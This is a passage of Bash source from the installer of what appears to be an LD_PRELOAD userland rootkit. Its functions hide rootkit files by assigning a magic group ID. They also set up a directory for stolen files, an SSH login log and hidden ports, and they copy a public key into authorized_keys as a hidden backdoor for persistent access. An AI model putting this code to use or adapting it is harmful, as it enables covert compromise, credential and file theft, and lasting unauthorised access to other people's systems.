hide_path(){ chown -h 0:$MAGIC_GID $1; } # -h in case path is a symbolic link

# hides rootkit files within the home/install directory, and
# other any files created in the setup stage.
hide_rootkitfiles(){  # $1 = home/install directory
    local homedir="$1"
    local hide_files=()
    [ ! -d $homedir ] && return

    hide_files+=($LDSO_PRELOAD $homedir $homedir/*)

    # only hide specific paths if their respective toggles are enabled
    [ -f $homedir/bd_bashrc ] && hide_files+=($homedir/.profile)
    [ `toggle_enabled HIDE_PORTS` == "true" ] && hide_files+=($HIDEPORTS)
    [ `toggle_enabled LOG_SSH` == "true" ] && hide_files+=($SSH_LOGS)         # $SSH_LOGS and $INTEREST_DIR
    [ `toggle_enabled FILE_STEAL` == "true" ] && hide_files+=($INTEREST_DIR)  # are both files in totally
                                                                              # random locations.
    for file in ${hide_files[@]}; do
        [ ! -f $file ] && touch $file # if it doesn't exist rn, create it before hiding it.
                                      # it should, at some point soon, get used.
        hide_path $file
    done
}

# setup a special path for things and make a link of it in the install dir.
setup_path(){ # $1 = home/install directory, $2 = dir/file, $3 = name of variable to path
    local homedir option path_varname filename path

    homedir="$1"
    option="$2"
    path_varname="$3"

    # variable name, lowercase.
    filename="`echo -n $path_varname | tr '[:upper:]' '[:lower:]'`"
    path=${!path_varname}   # get value (path) of given variable

    [ $option == 'dir' ] && mkdir -p $path
    [ $option == 'file' ] && touch $path
    chmod 666 $path && ln -s $path $homedir/$filename
}

setup_home(){ # $1 = home/install directory
    local homedir="$1"
    [ ! -d "$homedir" ] && return

    # copy over any files we may want. (etc/defaults.sh:COPY_FILES array)
    # files are copied to the root of the installation directory. files copied
    # are by default hidden.
    necho "Copying miscellaneous files to install directory"
    for file in ${COPY_FILES[@]}; do
        local dest="$homedir/`basename $file`"
        cp $file $dest
        [ "`toggle_enabled HIDE_SELF`" == "true" ] && hide_path $dest
    done

    [ -f $homedir/.bashrc ] &&  {
        echo '. .bashrc' > "$homedir/.profile" &&
        hide_path $homedir/.profile;
    }

    [ "`toggle_enabled FILE_STEAL`" == "true" ] && {
        necho "Setting up path for stolen files" &&
        setup_path $homedir 'dir' INTEREST_DIR;
    }

    [ "`toggle_enabled LOG_SSH`" == "true" ] && {
        necho "Setting up path for ssh logs" &&
        setup_path $homedir 'file' SSH_LOGS;
    }

    [ "`toggle_enabled HIDE_PORTS`" == "true" ] && {
        necho "Setting up & writing 'hide_ports'" &&
        setup_path $homedir 'file' HIDEPORTS &&
        write_hideports $HIDEPORTS;
    }

    [ "`toggles READ_GID_FROM_FILE`" == 'true' ] && {
        necho 'Setting up magic GID file' &&
        touch $GID_PATH && chmod 644 $GID_PATH &&
        echo -n "$MAGIC_GID" > $GID_PATH;
    }

    [ "`toggle_enabled HIDE_MY_ASS`" == 'true' ] && touch $homedir/my_ass

    [ "`toggle_enabled HIDE_SELF`" == "true" ] && {
        necho "Hiding all rootkit files" &&
        hide_rootkitfiles $homedir;
    }

    [ -f './etc/id_rsa.pub' ] && {
        necho "Copying ./etc/id_rsa.pub to $homedir/.ssh/authorized_keys" &&
        mkdir $homedir/.ssh && cp ./etc/id_rsa.pub $homedir/.ssh/authorized_keys &&
        hide_path $homedir/.ssh/authorized_keys;
    }
}
